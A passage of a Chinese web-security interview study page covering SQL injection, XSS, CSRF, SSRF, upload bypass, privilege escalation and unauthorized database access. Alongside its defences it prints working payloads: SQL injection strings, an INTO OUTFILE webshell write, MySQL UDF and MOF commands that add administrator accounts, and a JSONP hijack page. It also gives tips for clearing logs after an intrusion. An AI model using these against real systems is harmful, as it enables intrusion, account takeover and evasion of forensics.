+<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>统一数据库、Web应用、操作系统所使用的字符集，避免解析产生差异，最好都设置为UTF-8。 或对数据进行正确的转义，如mysql_real_escape_string+mysql_set_charset的使用。</p>
+<h3 id="sql里面只有update怎么利用"><a href="#sql里面只有update怎么利用" class="headerlink" title="sql里面只有update怎么利用"></a>sql里面只有update怎么利用</h3><p>先理解这句 SQL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">UPDATE user SET password=&#x27;MD5($password)&#x27;, homepage=&#x27;$homepage&#x27; WHERE id=&#x27;$id&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>如果此 SQL 被修改成以下形式，就实现了注入</p>
+<p>1：修改 homepage 值为<code>http://xxx.net&#39;, userlevel=&#39;3</code></p>
+<p>之后 SQL 语句变为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">UPDATE user SET password=&#x27;mypass&#x27;, homepage=&#x27;http://xxx.net&#x27;, userlevel=&#x27;3&#x27; WHERE id=&#x27;$id&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>userlevel 为用户级别</p>
+<p>2:修改 password 值为<code>mypass)&#39; WHERE username=&#39;admin&#39;#</code></p>
+<p>之后 SQL 语句变为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">UPDATE user SET password=&#x27;MD5(mypass)&#x27; WHERE username=&#x27;admin&#x27;#)&#x27;, homepage=&#x27;$homepage&#x27; WHERE id=&#x27;$id&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>3：修改 id 值为<code>&#39; OR username=&#39;admin&#39;</code> 之后 SQL 语句变为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">UPDATE user SET password=&#x27;MD5($password)&#x27;, homepage=&#x27;$homepage&#x27; WHERE id=&#x27;&#x27; OR username=&#x27;admin&#x27;<br></code></pre></td></tr></table></figure>
+
+<h2 id="sql如何写shell-x2F-单引号被过滤怎么办"><a href="#sql如何写shell-x2F-单引号被过滤怎么办" class="headerlink" title="sql如何写shell&#x2F;单引号被过滤怎么办"></a>sql如何写shell&#x2F;单引号被过滤怎么办</h2><p>写shell: root权限，GPC关闭，知道文件路径 outfile函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">`http://127.0.0.1:81/sqli.php?id=1 into outfile &#x27;C:\\wamp64\\www\\phpinfo.php&#x27; FIELDS TERMINATED BY &#x27;&lt;?php phpinfo(); ?&gt;&#x27;`<br><br>`http://127.0.0.1:81/sqli.php?id=-1 union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile &#x27;C:\\wamp64\\www\\phpinfo.php&#x27;`<br></code></pre></td></tr></table></figure>
+
+<p>宽字节注入</p>
+<h3 id="代替空格的方法"><a href="#代替空格的方法" class="headerlink" title="代替空格的方法"></a>代替空格的方法</h3><p>%0a、%0b、%a0 等 &#x2F;**&#x2F; 等注释符 &lt;&gt;</p>
+<h3 id="mysql的网站注入，5-0以上和5-0以下有什么区别？"><a href="#mysql的网站注入，5-0以上和5-0以下有什么区别？" class="headerlink" title="mysql的网站注入，5.0以上和5.0以下有什么区别？"></a>mysql的网站注入，5.0以上和5.0以下有什么区别？</h3><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p>
+<p>5.0以下是多用户单操作，5.0以上是多用户多操做。</p>
+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。 需要诱使用户“点击”一个恶意链接，才能攻击成功</p>
+<h3 id="储存型"><a href="#储存型" class="headerlink" title="储存型"></a>储存型</h3><p>存储型XSS会把用户输入的数据“存储”在服务器端。 这种XSS具有很强的稳定性。</p>
+<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</p>
+<h2 id="DOM型和反射型的区别"><a href="#DOM型和反射型的区别" class="headerlink" title="DOM型和反射型的区别"></a>DOM型和反射型的区别</h2><p>反射型XSS：通过诱导用户点击，我们构造好的恶意payload才会触发的XSS。 反射型XSS的检测我们在每次请求带payload的链接时页面应该是会带有特定的畸形数据的。 DOM型：通过修改页面的DOM节点形成的XSS。 DOM-based XSS由于是通过js代码进行dom操作产生的XSS，所以在请求的响应中我们甚至不一定会得到相应的畸形数据。 根本区别在我看来是输出点的不同。</p>
+<h2 id="DOM型XSS-自动化测试或人工测试"><a href="#DOM型XSS-自动化测试或人工测试" class="headerlink" title="DOM型XSS 自动化测试或人工测试"></a>DOM型XSS 自动化测试或人工测试</h2><p>人工测试思路：找到类似document.write、innerHTML赋值、outterHTML赋值、window.location操作、写javascript:后内容、eval、setTimeout 、setInterval 等直接执行之类的函数点。找到其变量，回溯变量来源观察是否可控，是否经过安全函数。 自动化测试参看道哥的博客，思路是从输入入手，观察变量传递的过程，最终检查是否有在危险函数输出，中途是否有经过安全函数。但是这样就需要有一个javascript解析器，否则会漏掉一些通过js执行带入的部分内容。</p>
+<p>在回答这段问题的时候，由于平时对客户的检测中，基本是凭借不同功能点的功能加上经验和直觉来进行检测，对不同类型的XSS检测方式实际上并没有太过细分的标准化检测方式，所以回答的很烂。。。</p>
+<h2 id="如何快速发现xss位置"><a href="#如何快速发现xss位置" class="headerlink" title="如何快速发现xss位置"></a>如何快速发现xss位置</h2><h2 id="对于XSS怎么修补建议"><a href="#对于XSS怎么修补建议" class="headerlink" title="对于XSS怎么修补建议"></a>对于XSS怎么修补建议</h2><p>输入点检查：对用户输入的数据进行合法性检查，使用filter过滤敏感字符或对进行编码转义，针对特定类型数据进行格式检查。针对输入点的检查最好放在服务器端实现。</p>
+<p>输出点检查：对变量输出到HTML页面中时，对输出内容进行编码转义，输出在HTML中时，对其进行HTMLEncode，如果输出在Javascript脚本中时，对其进行JavascriptEncode。 对使用JavascriptEncode的变量都放在引号中并转义危险字符，data部分就无法逃逸出引号外成为code的一部分。还可以使用更加严格的方法，对所有数字字母之外的字符都使用十六进制编码。此外，要注意在浏览器中，HTML的解析会优先于Javascript的解析，编码的方式也需要考虑清楚，针对不同的输出点，我们防御XSS的方法可能会不同，这点可能在之后的文章会做下总结。</p>
+<p>除此之外，还有做HTTPOnly对Cookie劫持做限制。</p>
+<h2 id="XSS蠕虫的产生条件"><a href="#XSS蠕虫的产生条件" class="headerlink" title="XSS蠕虫的产生条件"></a>XSS蠕虫的产生条件</h2><p>正常情况下，一个是产生XSS点的页面不属于self页面，用户之间产生交互行为的页面，都可能造成XSS Worm的产生。<strong>不一定需要</strong>存储型XSS</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/191274.html">参考链接</a></p>
+<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h2><p>CSRF是跨站请求伪造攻击，由客户端发起,是由于没有在关键操作执行时进行是否由用户自愿发起的确认</p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul>
+<li>验证Referer</li>
+<li>添加token</li>
+</ul>
+<h2 id="token和referer做横向对比，谁安全等级高？"><a href="#token和referer做横向对比，谁安全等级高？" class="headerlink" title="token和referer做横向对比，谁安全等级高？"></a>token和referer做横向对比，谁安全等级高？</h2><p>token安全等级更高，因为并不是任何服务器都可以取得referer，如果从HTTPS跳到HTTP，也不会发送referer。并且FLASH一些版本中可以自定义referer。 但是token的话，要保证其足够随机且不可泄露。(不可预测性原则)</p>
+<h2 id="对referer的验证，从什么角度去做？如果做，怎么杜绝问题"><a href="#对referer的验证，从什么角度去做？如果做，怎么杜绝问题" class="headerlink" title="对referer的验证，从什么角度去做？如果做，怎么杜绝问题"></a>对referer的验证，从什么角度去做？如果做，怎么杜绝问题</h2><p>对header中的referer的验证，一个是空referer，一个是referer过滤或者检测不完善。 为了杜绝这种问题，在验证的白名单中，正则规则应当写完善。</p>
+<h2 id="针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？"><a href="#针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？" class="headerlink" title="针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？"></a>针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？</h2><p>引用一段请教前辈的回答：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">针对token的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等，二是结合信息泄露漏洞对它的获取，结合着发起组合攻击<br>信息泄露有可能是缓存、日志、get，也有可能是利用跨站<br>很多跳转登录的都依赖token，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了<br>另外也可以结合着其它业务来描述token的安全性及设计不好怎么被绕过比如抢红包业务之类的<br></code></pre></td></tr></table></figure>
+
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
+<h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>SSRF漏洞的验证方法：</p>
+<p>1）因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞</p>
+<p>2）在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a target="_blank" rel="noopener" href="http://www.baidu.com/xxx.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞 4</a></p>
+<h2 id="SSRF漏洞的成因-防御-绕过"><a href="#SSRF漏洞的成因-防御-绕过" class="headerlink" title="SSRF漏洞的成因 防御 绕过"></a>SSRF漏洞的成因 防御 绕过</h2><p>成因：模拟服务器对其他服务器资源进行请求，没有做合法性验证。 利用：构造恶意内网IP做探测，或者使用其余所支持的协议对其余服务进行攻击。 防御：禁止跳转，限制协议，内外网限制，URL限制。 绕过：使用不同协议，针对IP，IP格式的绕过，针对URL，恶意URL增添其他字符，@之类的。301跳转+dns rebindding。</p>
+<h1 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h1><h2 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title="文件上传漏洞原理"></a>文件上传漏洞原理</h2><p>由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致用户可以越过其本身权限向服务器上传可执行的动态脚本文件</p>
+<h2 id="常见的上传绕过方式"><a href="#常见的上传绕过方式" class="headerlink" title="常见的上传绕过方式"></a>常见的上传绕过方式</h2><ul>
+<li>前端js验证：禁用js&#x2F;burp改包</li>
+<li>大小写</li>
+<li>双重后缀名</li>
+<li>过滤绕过 pphphp-&gt;php</li>
+</ul>
+<h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><ul>
+<li>文件上传目录设置为不可执行</li>
+<li>使用白名单判断文件上传类型</li>
+<li>用随机数改写文件名和路径</li>
+</ul>
+<h2 id="审查上传点的元素有什么意义？"><a href="#审查上传点的元素有什么意义？" class="headerlink" title="审查上传点的元素有什么意义？"></a>审查上传点的元素有什么意义？</h2><p>有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>引入一段用户能控制的脚本或代码，并让服务器端执行 （1）include()等函数通过动态变量的方式引入需要包含的文件； （2）用户能够控制该动态变量。</p>
+<h2 id="导致文件包含的函数"><a href="#导致文件包含的函数" class="headerlink" title="导致文件包含的函数"></a>导致文件包含的函数</h2><p>PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfile(), … JSP&#x2F;Servlet：ava.io.File(), java.io.Fil-eReader(), … ASP：include file, include virtual,</p>
+<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞</p>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><h2 id="金融行业常见逻辑漏洞"><a href="#金融行业常见逻辑漏洞" class="headerlink" title="金融行业常见逻辑漏洞"></a>金融行业常见逻辑漏洞</h2><p>单针对金融业务的 主要是数据的篡改(涉及金融数据，或部分业务的判断数据)，由竞争条件或者设计不当引起的薅羊毛，交易&#x2F;订单信息泄露，水平越权对别人的账户查看或恶意操作，交易或业务步骤绕过。</p>
+<h1 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h1><h1 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h1><p>中间人攻击是一个（缺乏）相互认证的攻击；由于客户端与服务器之间在SSL握手的过程中缺乏相互认证而造成的漏洞</p>
+<p>防御中间人攻击的方案通常基于一下几种技术</p>
+<p>1.公钥基础建设PKI 使用PKI相互认证机制，客户端验证服务器，服务器验证客户端；上述两个例子中都是只验证服务器，这样就造成了SSL握手环节的漏洞，而如果使用相互认证的的话，基本可以更强力的相互认证</p>
+<p>2.延迟测试</p>
+<p>使用复杂加密哈希函数进行计算以造成数十秒的延迟；如果双方通常情况下都要花费20秒来计算，并且整个通讯花费了60秒计算才到达对方，这就能表明存在第三方中间人。</p>
+<p>3.使用其他形式的密钥交换形式</p>
+<h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理:"></a>原理:</h3><p>每台主机都有一个ARP缓存表，缓存表中记录了IP地址与MAC地址的对应关系，而局域网数据传输依靠的是MAC地址。 在ARP缓存表机制存在一个缺陷，就是当请求主机收到ARP应答包后，不会去验证自己是否向对方主机发送过ARP请求包，就直接把这个返回包中的IP地址与MAC地址的对应关系保存进ARP缓存表中，如果原有相同IP对应关系，原有的则会被替换。这样攻击者就有了偷听主机传输的数据的可能</p>
+<h3 id="防护-1"><a href="#防护-1" class="headerlink" title="防护"></a>防护</h3><p>1.在主机绑定网关MAC与IP地址为静态（默认为动态），命令：arp -s 网关IP 网关MAC</p>
+<p>2.在网关绑定主机MAC与IP地址</p>
+<p>3.使用ARP防火墙</p>
+<h1 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h1><h2 id="Ddos原理"><a href="#Ddos原理" class="headerlink" title="Ddos原理"></a>Ddos原理</h2><p>利用合理的请求造成资源过载，导致服务不可用</p>
+<h3 id="syn洪流的原理"><a href="#syn洪流的原理" class="headerlink" title="syn洪流的原理"></a>syn洪流的原理</h3><p>伪造大量的源IP地址，分别向服务器端发送大量的SYN包，此时服务器端会返回SYN&#x2F;ACK包，因为源地址是伪造的，所以伪造的IP并不会应答，服务器端没有收到伪造IP的回应，会重试3～5次并且等待一个SYNTime（一般为30秒至2分钟），如果超时则丢弃这个连接。攻击者大量发送这种伪造源地址的SYN请求，服务器端将会消耗非常多的资源（CPU和内存）来处理这种半连接，同时还要不断地对这些IP进行SYN+ACK重试。最后的结果是服务器无暇理睬正常的连接请求，导致拒绝服务。</p>
+<h3 id="CC攻击原理"><a href="#CC攻击原理" class="headerlink" title="CC攻击原理"></a>CC攻击原理</h3><p>对一些消耗资源较大的应用页面不断发起正常的请求，以达到消耗服务端资源的目的。</p>
+<h2 id="DDOS防护"><a href="#DDOS防护" class="headerlink" title="DDOS防护"></a>DDOS防护</h2><p>SYN Cookie&#x2F;SYN Proxy、safereset等算法。SYN Cookie的主要思想是为每一个IP地址分配一个“Cookie”，并统计每个IP地址的访问频率。如果在短时间内收到大量的来自同一个IP地址的数据包，则认为受到攻击，之后来自这个IP地址的包将被丢弃。</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="mysql两种提权方式"><a href="#mysql两种提权方式" class="headerlink" title="mysql两种提权方式"></a>mysql两种提权方式</h2><p>udf提权,mof提权</p>
+<h3 id="Mysql-UDF提权"><a href="#Mysql-UDF提权" class="headerlink" title="Mysql_UDF提权"></a>Mysql_UDF提权</h3><p>要求: 1.目标系统是Windows(Win2000,XP,Win2003)； 2.拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数 3.有root账号密码 导出udf: MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的lib\plugin文件夹下才能创建自定义函数 可以再mysql里输入 <code>select @@basedir</code> <code>show variables like ‘%plugins%’</code> 寻找mysql安装路径 提权:</p>
+<p>使用SQL语句创建功能函数。语法：Create Function 函数名（函数名只能为下面列表中的其中之一）returns string soname ‘导出的DLL路径’；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">create function cmdshell returns string soname ‘udf.dll’<br>select cmdshell(‘net user arsch arsch /add’);<br>select cmdshell(‘net localgroup administrators arsch /add’);<br><br>drop function cmdshell;<br></code></pre></td></tr></table></figure>
+
+<p>该目录默认是不存在的，这就需要我们使用webshell找到MYSQL的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录即可。</p>
+<h3 id="Mysql-mof提权"><a href="#Mysql-mof提权" class="headerlink" title="Mysql mof提权"></a>Mysql mof提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)<br><br>instance of __EventFilter as $EventFilter<br>&#123;<br>EventNamespace = &quot;Root\\Cimv2&quot;;<br>Name  = &quot;filtP2&quot;;<br>Query = &quot;Select * From __InstanceModificationEvent &quot;<br>&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;<br>&quot;And TargetInstance.Second = 5&quot;;<br>QueryLanguage = &quot;WQL&quot;;<br>&#125;;<br><br>instance of ActiveScriptEventConsumer as $Consumer<br>&#123;<br>Name = &quot;consPCSV2&quot;;<br>ScriptingEngine = &quot;JScript&quot;;<br>ScriptText =<br>&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user waitalone waitalone.cn /add\&quot;)&quot;;<br>&#125;;<br><br>instance of __FilterToConsumerBinding<br>&#123;<br>Consumer   = $Consumer;<br>Filter = $EventFilter;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>其中的第18行的命令，上传前请自己更改。</p>
+<p>2、执行load_file及into dumpfile把文件导出到正确的位置即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select load file(&#x27;c:/wmpub/nullevt.mof&#x27;) into dumpfile &#x27;c:/windows/system32/wbem/mof/nullevt.mov&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接之就ok了。</p>
+<h1 id="特殊漏洞"><a href="#特殊漏洞" class="headerlink" title="特殊漏洞"></a>特殊漏洞</h1><h2 id="Struts2-045"><a href="#Struts2-045" class="headerlink" title="Struts2-045"></a>Struts2-045</h2><h2 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h2><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器</p>
+<h3 id="利用条件和方法"><a href="#利用条件和方法" class="headerlink" title="利用条件和方法"></a>利用条件和方法</h3><p>条件:</p>
+<ol>
+<li>redis服务以root账户运行</li>
+<li>redis无密码或弱密码进行认证</li>
+<li>redis监听在0.0.0.0公网上</li>
+</ol>
+<p>方法:</p>
+<ul>
+<li>通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫</li>
+<li>上传SSH公钥获得SSH登录权限</li>
+<li>通过crontab反弹shell</li>
+<li>slave主从模式利用</li>
+</ul>
+<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><ul>
+<li>密码验证</li>
+<li>降权运行</li>
+<li>限制ip&#x2F;修改端口</li>
+</ul>
+<h2 id="Jenkins未授权访问"><a href="#Jenkins未授权访问" class="headerlink" title="Jenkins未授权访问"></a>Jenkins未授权访问</h2><p>攻击者通过未授权访问进入脚本命令执行界面执行攻击指令</p>
+<p><code>println &quot;ifconfig -a&quot;.execute().text</code> 执行一些系统命令,利用wget下载webshell</p>
+<h2 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h2><p>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。</p>
+<h3 id="防护-2"><a href="#防护-2" class="headerlink" title="防护"></a>防护</h3><p>1、为MongoDB添加认证： 1)MongoDB启动时添加–auth参数 2)给MongoDB添加用户： use admin #使用admin库 db.addUser(“root”, “123456”) #添加用户名root密码123456的用户 db.auth(“root”,“123456”) #验证下是否添加成功，返回1说明成功 2、禁用HTTP和REST端口 MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface&#x3D;false 3、限制绑定IP 启动时加入参数 –bind_ip 127.0.0.1 或在&#x2F;etc&#x2F;mongodb.conf文件中添加以下内容： bind_ip &#x3D; 127.0.0.1</p>
+<h2 id="Memcache未授权访问"><a href="#Memcache未授权访问" class="headerlink" title="Memcache未授权访问"></a>Memcache未授权访问</h2><p>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>1、登录机器执行netstat -an |more命令查看端口监听情况。回显0.0.0.0:11211表示在所有网卡进行监听，存在memcached未授权访问漏洞。</p>
+<p>2、telnet 11211，或nc -vv 11211，提示连接成功表示漏洞存在</p>
+<h3 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title="漏洞加固"></a>漏洞加固</h3><ul>
+<li>1、设置memchached只允许本地访问</li>
+<li>2、禁止外网访问Memcached 11211端口</li>
+<li>3、编译时加上–enable-sasl，启用SASL认证</li>
+</ul>
+<h2 id="FFMPEG-本地文件读取漏洞"><a href="#FFMPEG-本地文件读取漏洞" class="headerlink" title="FFMPEG 本地文件读取漏洞"></a>FFMPEG 本地文件读取漏洞</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>通过调用加密API将payload加密放入一个会被执行的段字节中。但是具体回答工程中我只回答道了SSRF老洞，m3u8头，偏移量，加密。</p>
+<h1 id="安全知识"><a href="#安全知识" class="headerlink" title="安全知识"></a>安全知识</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="常用WEB开发JAVA框架"><a href="#常用WEB开发JAVA框架" class="headerlink" title="常用WEB开发JAVA框架"></a>常用WEB开发JAVA框架</h3><p>STRUTS,SPRING 常见的java框架漏洞 其实面试官问这个问题的时候我不太清楚他要问什么，我提到struts的045 048，java常见反序列化。 045 错误处理引入了ognl表达式 048 封装action的过程中有一步调用getstackvalue递归获取ognl表达式 反序列化 操作对象，通过手段引入。apache common的反射机制、readobject的重写，其实具体的我也记不清楚。。。然后这部分就结束了</p>
+<h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><p>同源策略限制不同源对当前document的属性内容进行读取或设置。 不同源的区分：协议、域名、子域名、IP、端口，以上有不同时即不同源。</p>
+<h3 id="Jsonp安全攻防技术，怎么写Jsonp的攻击页面？"><a href="#Jsonp安全攻防技术，怎么写Jsonp的攻击页面？" class="headerlink" title="Jsonp安全攻防技术，怎么写Jsonp的攻击页面？"></a>Jsonp安全攻防技术，怎么写Jsonp的攻击页面？</h3><h4 id="涉及到Jsonp的安全攻防内容"><a href="#涉及到Jsonp的安全攻防内容" class="headerlink" title="涉及到Jsonp的安全攻防内容"></a>涉及到Jsonp的安全攻防内容</h4><p>JSON劫持、Callback可定义、JSONP内容可定义、Content-type不为json。</p>
+<h4 id="攻击页面"><a href="#攻击页面" class="headerlink" title="攻击页面"></a>攻击页面</h4><p>JSON劫持，跨域劫持敏感信息，页面类似于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">function wooyun(v)&#123;<br>alert(v.username);<br>&#125;<br>&lt;/script&gt;<br>&lt;script src=&quot;http://js.login.360.cn/?o=sso&amp;m=info&amp;func=wooyun&quot;&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>Content-type不正确情况下，JSONP和Callback内容可定义可造成XSS。 JSONP和FLASH及其他的利用参照知道创宇的JSONP安全攻防技术。</p>
+<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="php中命令执行涉及到的函数"><a href="#php中命令执行涉及到的函数" class="headerlink" title="php中命令执行涉及到的函数"></a>php中命令执行涉及到的函数</h3><p>1，代码执行：eval()、assert()、popen()、system()、exec()、shell_exec()、passthru(),pcntl_exec(),call_user_func_array(),create_function() 2，文件读取：file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等 3，命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
+<h3 id="安全模式下绕过php的disable-fuction"><a href="#安全模式下绕过php的disable-fuction" class="headerlink" title="安全模式下绕过php的disable fuction"></a>安全模式下绕过php的disable fuction</h3><p>DL函数，组件漏洞，环境变量。</p>
+<h3 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h3><p><code>==</code> 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
+<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
+<p><code>0e</code>开头的字符串等于0</p>
+<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h3 id="各种数据库文件存放的位置"><a href="#各种数据库文件存放的位置" class="headerlink" title="各种数据库文件存放的位置"></a>各种数据库文件存放的位置</h3><p>mysql:<code>/usr/local/mysql/data/</code> <code>C:\ProgramData\MySQL\MySQL Server 5.6\Data\</code> oracle:<code>$ORACLE_BASE/oradata/$ORACLE_SID/</code></p>
+<h2 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h2><h3 id="如何清理日志"><a href="#如何清理日志" class="headerlink" title="如何清理日志"></a>如何清理日志</h3><p>meterpreter: <code>clearev</code></p>
+<h3 id="入侵-Linux-服务器后需要清除哪些日志？"><a href="#入侵-Linux-服务器后需要清除哪些日志？" class="headerlink" title="入侵 Linux 服务器后需要清除哪些日志？"></a>入侵 Linux 服务器后需要清除哪些日志？</h3><p>web日志，如apache的access.log,error.log。 直接将日志清除过于明显,一般使用sed进行定向清除</p>
